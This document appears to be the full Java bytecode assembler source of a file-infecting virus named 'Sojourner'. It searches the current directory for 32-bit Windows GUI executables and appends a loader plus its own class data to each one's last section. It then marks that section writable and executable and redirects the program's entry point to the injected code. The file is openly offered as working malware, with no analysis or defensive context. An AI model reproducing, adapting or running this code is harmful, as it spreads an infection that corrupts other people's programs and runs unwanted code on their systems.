.class public Sojourner
.super java/lang/Object
.method public S([B)V
.limit stack 5
.limit locals 26
.catch java/lang/Exception from try_begin to catch_begin using catch_begin
.catch java/lang/Exception from code_begin to code_end using main_catch

;-------------------------------------------------------------------------------
;find files in current directory
;-------------------------------------------------------------------------------

code_begin:
        new               java/io/File
        dup
        ldc               "."                ;current directory, any file
        invokespecial     java/io/File.<init>(Ljava/lang/String;)V
        invokevirtual     java/io/File.listFiles()[Ljava/io/File;
        astore            15                 ;store array reference
        iconst_4
        newarray          byte               ;T_BYTE
        astore_0

find_next:
        aload             15
        iload             4
        aaload                               ;load reference to array[index]
        invokevirtual     java/io/File.isFile()Z
        ifeq              find_iindex        ;skip directories

try_begin:
        new               java/io/RandomAccessFile
        dup
        aload             15
        iload             4
        aaload
        invokevirtual     java/io/File.getName()Ljava/lang/String;
        ldc               "rw"               ;read/write access
        invokespecial     java/io/RandomAccessFile.<init>(Ljava/lang/String;Ljava/lang/String;)V
        astore_3

;-------------------------------------------------------------------------------
;parse file struct
;signatures must match those of PE exe files
;-------------------------------------------------------------------------------

        jsr               file_read2
        sipush            0x5a4d             ;IMAGE_DOS_SIGNATURE
        if_icmpne         close_fileobj
        aload_3
        bipush            0x3c
        i2l
        invokevirtual     java/io/RandomAccessFile.seek(J)V
        jsr               file_read4
        istore_2                             ;store offset to IMAGE_NT_HEADERS
        aload_3
        iload_2                              ;IMAGE_NT_HEADERS
        i2l
        invokevirtual     java/io/RandomAccessFile.seek(J)V
        jsr               file_read4
        sipush            0x4550             ;IMAGE_NT_SIGNATURE
        if_icmpne         close_fileobj

;-------------------------------------------------------------------------------
;32-bit machine
;do not test IMAGE_FILE_32BIT_MACHINE because it is ignored by Windows even for PE32+
;-------------------------------------------------------------------------------

        jsr               file_read2
        sipush            0x14c              ;IMAGE_FILE_MACHINE_I386
        if_icmpne         close_fileobj

;-------------------------------------------------------------------------------
;calculate offset to last section at this point
;check SizeOfOptionalHeader for standard size
;-------------------------------------------------------------------------------

        jsr               file_read2
        iconst_1
        isub
        bipush            0x28               ;sizeof IMAGE_SECTION_HEADER
        imul
        iload_2                              ;IMAGE_NT_HEADERS
        iadd
        istore_2                             ;must store before invoke
        aload_3
        bipush            0xc                ;IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader - IMAGE_NT_HEADERS.FileHeader.TimeDateStamp
        invokevirtual     java/io/RandomAccessFile.skipBytes(I)I
        pop
        jsr               file_read2
        dup                                  ;one to store, one to compare
        sipush            0xe0
        if_icmpne         catch_begin        ;close_fileobj
        iload_2                              ;IMAGE_NT_HEADERS.FileHeader.NumberOfSections - 1 * sizeof IMAGE_SECTION_HEADER
        iadd                                 ;IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader + (IMAGE_NT_HEADERS.FileHeader.NumberOfSections - 1) * sizeof IMAGE_SECTION_HEADER
        bipush            0x20               ;IMAGE_NT_HEADERS.OptionalHeader + sizeof IMAGE_SECTION_HEADER.Name
        iadd
        istore_2

;-------------------------------------------------------------------------------
;standard characteristics
;-------------------------------------------------------------------------------

        jsr               file_read2
        sipush            0x10f              ;IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_RELOCS_STRIPPED | IMAGE_FILE_LINE_NUMS_STRIPPED | IMAGE_FILE_LOCAL_SYMS_STRIPPED | IMAGE_FILE_32BIT_MACHINE
        if_icmpne         close_fileobj

;-------------------------------------------------------------------------------
;IMAGE_NT_OPTIONAL_HDR_MAGIC must match PE32 structure (not ROM, not 64-bit) configuration
;-------------------------------------------------------------------------------

        jsr               file_read2
        sipush            0x10b              ;IMAGE_NT_OPTIONAL_HDR32_MAGIC
        if_icmpne         close_fileobj

;-------------------------------------------------------------------------------
;save current pointer and entrypoint for later use
;-------------------------------------------------------------------------------

        aload_3
        bipush            0xe                ;IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint - IMAGE_NT_HEADERS.OptionalHeader
        invokevirtual     java/io/RandomAccessFile.skipBytes(I)I
        pop
        aload_3
        invokevirtual     java/io/RandomAccessFile.getFilePointer()J
        lstore            9
        jsr               file_read4
        istore            5

;-------------------------------------------------------------------------------
;Windows GUI subsystem file only
;-------------------------------------------------------------------------------

        aload_3
        bipush            0x30               ;IMAGE_NT_HEADERS.OptionalHeader.Subsystem - IMAGE_NT_HEADERS.OptionalHeader.BaseOfCode
        invokevirtual     java/io/RandomAccessFile.skipBytes(I)I
        pop
        jsr               file_read2
        iconst_2                             ;IMAGE_SUBSYSTEM_WINDOWS_GUI
        if_icmpne         close_fileobj

;-------------------------------------------------------------------------------
;null DLLCharacteristics field
;-------------------------------------------------------------------------------

        jsr               file_read2
        ifne              close_fileobj

;-------------------------------------------------------------------------------
;no config table, because it might contain SafeSEH
;-------------------------------------------------------------------------------

        aload_3
        bipush            0x6a
        invokevirtual     java/io/RandomAccessFile.skipBytes(I)I
        pop
        jsr               file_read4
        ifne              close_fileobj

;-------------------------------------------------------------------------------
;store fields for later use
;check file size.  if it contains appended data, do not infect
;-------------------------------------------------------------------------------

        aload_3
        iload_2
        i2l
        invokevirtual     java/io/RandomAccessFile.seek(J)V
        aload_3
        invokevirtual     java/io/RandomAccessFile.getFilePointer()J
        lstore            12                 ;save pointer, we must update this table later
        jsr               file_read4
        istore            6                  ;store VirtualSize
        jsr               file_read4
        istore            7                  ;store VirtualAddress
        jsr               file_read4
        istore_2                             ;store SizeOfRawData
        jsr               file_read4
        dup
        istore            8                  ;store PointerToRawData
        iload_2                              ;IMAGE_SECTION_HEADER.SizeOfRawData
        iadd
        i2l
        aload_3
        invokevirtual     java/io/RandomAccessFile.length()J
        lcmp
        ifne              close_fileobj      ;there's a path we can walk through the loss and the pity

;-------------------------------------------------------------------------------
;copy loader code and class file
;-------------------------------------------------------------------------------

        aload_3
        iload             8                  ;IMAGE_SECTION_HEADER.PointerToRawData
        iload_2                              ;IMAGE_SECTION_HEADER.SizeOfRawData
        iadd
        i2l
        invokevirtual     java/io/RandomAccessFile.seek(J)V
        aload_3
        bipush            0x68               ;push opcode
        invokevirtual     java/io/RandomAccessFile.write(I)V
        iload             5
        jsr               file_write         ;entrypoint RVA
        aload_3
        aload_1
        iconst_0
        aload_1
        arraylength                          ;it is size of appended data too
        invokevirtual     java/io/RandomAccessFile.write([BII)V

;-------------------------------------------------------------------------------
;increase file size
;-------------------------------------------------------------------------------

        aload_3
        aload_3
        invokevirtual     java/io/RandomAccessFile.getFilePointer()J
        sipush            0x1000
        i2l
        ladd
        invokevirtual     java/io/RandomAccessFile.setLength(J)V

;-------------------------------------------------------------------------------
;increase section virtual size
;-------------------------------------------------------------------------------

        aload_3
        lload             12                 ;pointer to IMAGE_SECTION_HEADER.VirtualSize
        invokevirtual     java/io/RandomAccessFile.seek(J)V
        iload             6                  ;IMAGE_SECTION_HEADER.VirtualSize
        sipush            0x1000
        iadd
        jsr               file_write

;-------------------------------------------------------------------------------
;increase section raw size
;-------------------------------------------------------------------------------

        aload_3
        iconst_4                             ;IMAGE_SECTION_HEADER.SizeOfRawData - IMAGE_SECTION_HEADER.VirtualAddress
        invokevirtual     java/io/RandomAccessFile.skipBytes(I)I
                                             ;or use jsr file_read4 instead of skipBytes
        pop
        iload_2                              ;IMAGE_SECTION_HEADER.SizeOfRawData
        sipush            0x1000
        iadd
        jsr               file_write

;-------------------------------------------------------------------------------
;alter section flags
;-------------------------------------------------------------------------------

        aload_3
        bipush            0x10               ;IMAGE_SECTION_HEADER.Characteristics - IMAGE_SECTION_HEADER.PointerToRawData
        invokevirtual     java/io/RandomAccessFile.skipBytes(I)I
        pop
        aload_3
        invokevirtual     java/io/RandomAccessFile.getFilePointer()J
        lstore            12
        jsr               file_read4
        bipush            0xa                ;IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE
        bipush            0x1c
        ishl
        ior
        aload_3
        lload             12                 ;pointer to IMAGE_SECTION_HEADERS.Characteristics
        invokevirtual     java/io/RandomAccessFile.seek(J)V
        jsr               file_write

;-------------------------------------------------------------------------------
;set entrypoint
;-------------------------------------------------------------------------------

        aload_3
        lload             9                  ;pointer to IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
        invokevirtual     java/io/RandomAccessFile.seek(J)V
        iload             7                  ;IMAGE_SECTION_HEADER.VirtualAddress
        iload_2                              ;IMAGE_SECTION_HEADER.SizeOfRawData
        iadd
        jsr               file_write

;-------------------------------------------------------------------------------
;increase size of image
;-------------------------------------------------------------------------------

        aload_3
        bipush            0x24               ;IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage - IMAGE_NT_HEADERS.OptionalHeader.BaseOfCode
        invokevirtual     java/io/RandomAccessFile.skipBytes(I)I
        pop
        aload_3
        invokevirtual     java/io/RandomAccessFile.getFilePointer()J
        lstore            12
        jsr               file_read4
        sipush            0x1000
        iadd
        aload_3
        lload             12
        invokevirtual     java/io/RandomAccessFile.seek(J)V
        jsr               file_write
        goto              close_fileobj

;-------------------------------------------------------------------------------
;read 4 bytes and convert them into a little-endian integer that we can use
;-------------------------------------------------------------------------------

file_read4:
        astore            11
        aload_3
        aload_0
        iconst_0
        iconst_4
        invokevirtual     java/io/RandomAccessFile.readFully([BII)V
        aload_0
        iconst_3
        baload
        bipush            0x18
        ishl
        aload_0
        iconst_2
        baload
        sipush            0xff
        iand
        bipush            0x10
        ishl
        ior
        aload_0
        iconst_1
        baload
        sipush            0xff
        iand
        bipush            8
        ishl
        ior
        aload_0
        iconst_0
        baload
        sipush            0xff
        iand
        ior
        ret               11

;-------------------------------------------------------------------------------
;read 2 bytes and convert them into a little-endian integer that we can use
;-------------------------------------------------------------------------------

file_read2:
        astore            11
        aload_3
        aload_0
        iconst_0
        iconst_2
        invokevirtual     java/io/RandomAccessFile.readFully([BII)V
        aload_0
        iconst_1
        baload
        sipush            0xff
        iand
        bipush            8
        ishl
        aload_0
        iconst_0
        baload
        sipush            0xff
        iand
        ior
        ret               11

;-------------------------------------------------------------------------------
;write little-endian dword
;-------------------------------------------------------------------------------

file_write:
        astore            11
        istore            14
        aload_0
        iconst_0
        iload             14
        bastore
        aload_0
        iconst_1
        iload             14
        bipush            8
        ishr
        bastore
        aload_0
        iconst_2
        iload_2
        bipush            16
        ishr
        bastore
        aload_0
        iconst_3
        iload             14
        bipush            24
        ishr
        bastore
        aload_3
        aload_0
        iconst_0
        iconst_4
        invokevirtual     java/io/RandomAccessFile.write([BII)V
        ret               11

catch_begin:
        pop

close_fileobj:
        aload_3
        ifnull            find_iindex
        aload_3
        invokevirtual     java/io/RandomAccessFile.close()V

find_iindex:
        iinc              4 1
        goto              find_next          ;no check
                                             ;an exception occurs and we are done  
code_end:

main_catch:                                  ;one value remains in the stack, but return is no ret
        return
.end method